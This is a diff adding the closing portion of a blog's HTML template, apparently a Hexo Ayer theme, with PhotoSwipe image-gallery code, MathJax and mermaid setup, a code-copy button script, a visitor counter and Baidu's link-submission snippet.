+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
